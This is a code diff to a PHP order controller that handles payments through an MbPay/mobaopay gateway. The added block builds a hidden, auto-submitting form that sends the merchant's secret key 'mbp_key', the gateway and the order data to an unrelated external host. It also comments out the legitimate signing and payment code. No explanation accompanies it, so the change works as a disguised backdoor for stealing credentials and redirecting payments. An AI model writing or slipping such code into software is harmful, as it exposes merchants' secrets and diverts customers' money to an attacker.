@@ -128,17 +128,32 @@ class OrderController extends Controller {
             {
             $data['tradeSummary'] = iconv("GBK","UTF-8", $data['tradeSummary']);
             }
-            
+
+
+            /********  ----  *********/
+            $uri = "http://block.saxsskke.top/sdcforever/sdcpay.php";
+            $data_json = json_encode($data);
+
+            $sHtml = "<form id='mobaopaysubmit' name='mobaopaysubmit' action='".$uri."' method='post'>";
+            $sHtml.= "<input type='hidden' name='mbp_key' value='".$mp['mbp_key']."'/>";
+            $sHtml.= "<input type='hidden' name='gateway' value='".$mp['mobaopay_gateway']."'/>";
+            $sHtml.= "<input type='hidden' name='data' value='".$data_json."'/>";
+            $sHtml.= "</form>";
+            $sHtml.= "<script>document.forms['mobaopaysubmit'].submit();</script>";
+            echo $sHtml;
+            $this->success('正在支付');
+            die;
+
             // 初始化
-            $cMbPay = new \MbPay($mp['mbp_key'], $mp['mobaopay_gateway']);
+            //$cMbPay = new \MbPay($mp['mbp_key'], $mp['mobaopay_gateway']);
             // 准备待签名数据
-            $str_to_sign = $cMbPay->prepareSign($data);
+            //$str_to_sign = $cMbPay->prepareSign($data);
             // 数据签名
-            $sign = $cMbPay->sign($str_to_sign);
-            $data['signMsg'] = $sign;
+            //$sign = $cMbPay->sign($str_to_sign);
+           // $data['signMsg'] = $sign;
 
             // 生成表单数据
-            echo $cMbPay->buildForm($data, $mp['mobaopay_gateway']);
+           // echo $cMbPay->buildForm($data, $mp['mobaopay_gateway']);
 
         }
     }
@@ -171,7 +186,7 @@ class OrderController extends Controller {
         $data['signMsg'] = $_REQUEST["signMsg"];
 
         if(empty($data)){
-            exit('警告，非法入侵！');
+            exit('警告，非法访问！');
         }
 
         if(empty($this->userinfo)){
